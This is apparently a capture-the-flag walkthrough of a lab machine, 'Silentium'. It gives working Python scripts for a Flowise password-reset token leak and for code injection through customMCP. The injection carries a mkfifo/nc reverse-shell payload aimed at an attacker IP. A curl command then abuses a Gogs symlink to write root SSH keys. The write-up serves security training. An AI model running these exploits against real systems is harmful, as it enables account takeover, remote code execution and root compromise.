02

Foothold — CVE-2025-58434 (Password Reset Token Leak)

Flowise 3.0.5 leaks the password reset token directly in the API response body when the email is wrapped in a user object. Combined the employee name "Ben" from the website with the domain to guess ben@silentium.htb, then confirmed the login endpoint returns HTTP 401 for wrong password vs HTTP 404 for unknown email — confirming the account exists.

Reset ben's password (Python one-shot):

cat > /tmp/reset.py << 'EOF'
import requests

url = "http://staging.silentium.htb"
session = requests.Session()

# Step 1: Leak the reset token
r = session.post(f"{url}/api/v1/account/forgot-password",
    json={"user": {"email": "ben@silentium.htb"}})

token = r.json()['user']['tempToken']
print("[+] Token:", token)

# Step 2: Reset password - must wrap in "user" object
r2 = session.post(f"{url}/api/v1/account/reset-password",
    json={"user": {
        "email": "ben@silentium.htb",
        "tempToken": token,
        "password": "Hacked123"
    }})
print("[+] Reset status:", r2.status_code)
print("[+] Reset body:", r2.text[:100])
EOF
python3 /tmp/reset.py

Login and get an API key. Key discovery: Flowise requires the x-request-from: internal header for API authentication to work at all.

cat > /tmp/pwn.py << 'EOF'
import requests

url = "http://staging.silentium.htb"
session = requests.Session()

# Reset password
r = session.post(f"{url}/api/v1/account/forgot-password",
    json={"user": {"email": "ben@silentium.htb"}})
token = r.json()['user']['tempToken']
session.post(f"{url}/api/v1/account/reset-password",
    json={"user": {"email": "ben@silentium.htb", "tempToken": token, "password": "Hacked123"}})
print("[+] Password reset done")

# Login WITH x-request-from: internal header
r = session.post(f"{url}/api/v1/auth/login",
    headers={"x-request-from": "internal"},
    json={"email": "ben@silentium.htb", "password": "Hacked123"})
print("[+] Login:", r.status_code)

# Get/Create API key WITH x-request-from: internal header
r2 = session.get(f"{url}/api/v1/apikey",
    headers={"x-request-from": "internal"})
print("[+] API Keys:", r2.status_code, r2.text[:300])

r3 = session.post(f"{url}/api/v1/apikey",
    headers={"x-request-from": "internal"},
    json={"keyName": "pwn"})
print("[+] Create key:", r3.status_code, r3.text[:300])
EOF

Why this matteredJSON structure matters here — CVE-2025-58434 only leaks the token when the email is wrapped in a `user` object, not a flat `{"email":"..."}`. And an undocumented required header (`x-request-from: internal`) gates the entire API — without it every authenticated call silently returns 401.

RCE — CVE-2025-59528 (Flowise customMCP Code Injection)

The /api/v1/node-load-method/customMCP endpoint evaluates mcpServerConfig as JavaScript server-side without sandboxing — child_process.exec() spawns a reverse shell directly.

Start listener (Terminal 1):

nc -lvnp 4444

Fire the RCE (Terminal 2):

cat > /tmp/rce.py << 'EOF'
import requests

url = "http://staging.silentium.htb"
session = requests.Session()

# Login
r = session.post(f"{url}/api/v1/auth/login",
    headers={"x-request-from": "internal"},
    json={"email": "ben@silentium.htb", "password": "Hacked123"})

# RCE payload
payload = {
    "loadMethod": "listActions",
    "inputs": {
        "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <KALI_VPN_IP> 4444 >/tmp/f');return 1;})()} )"
    }
}
r2 = session.post(f"{url}/api/v1/node-load-method/customMCP",
    headers={"x-request-from": "internal"},
    json=payload)
print("[+] RCE:", r2.status_code, r2.text[:200])
EOF
python3 /tmp/rce.py

Why this matteredEvaluating a user-supplied configuration blob as live JavaScript, server-side, with no sandbox is functionally the same bug class as `eval()` on untrusted input — MCP-adjacent tooling is new enough that this pattern shows up more than it should.

Exploit CVE-2025-8110 — write the SSH key via the API. Gogs follows symlinks without validation when updating file contents via the API. Since Gogs runs as root, it writes our SSH key directly into /root/.ssh/authorized_keys:

PAYLOAD=$(base64 -w0 /tmp/silentium_key.pub)
curl -s -X PUT http://127.0.0.1:9999/api/v1/repos/hacker/pwn/contents/symlink \
  -H "Authorization: token $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{\"content\":\"$PAYLOAD\",\"message\":\"pwn\"}"
{"commit":{...},"content":{"type":"symlink","target":"/root/.ssh/authorized_keys",...}}

The symlink was followed and our public key written to /root/.ssh/authorized_keys.

Why this matteredSymlink-following file-write APIs are a reliable arbitrary-file-write primitive the moment the service runs as root — pushing a symlink through git and then "editing" it through a REST API sidesteps any path-traversal filtering entirely, since the API never sees the real destination path.

08

Key Lessons

  1. JSON structure matters — CVE-2025-58434 only works with {"user":{"email":"..."}}, not a flat {"email":"..."}.
  2. Hidden headers — Flowise requires x-request-from: internal for API key endpoints to work. Without it, everything returns 401.
  3. Password reuse — the SMTP password in Docker env vars was reused for SSH.
  4. sshpass + special chars — use printf '%s' 'pass' > file && sshpass -f file ssh for passwords with ! or $.
  5. Services running as root — Gogs on port 3001 running as root made any file-write vuln an instant privesc.
  6. Symlink + API = arbitrary write — CVE-2025-8110 lets you write any file as root by pushing a symlink and updating it via API.
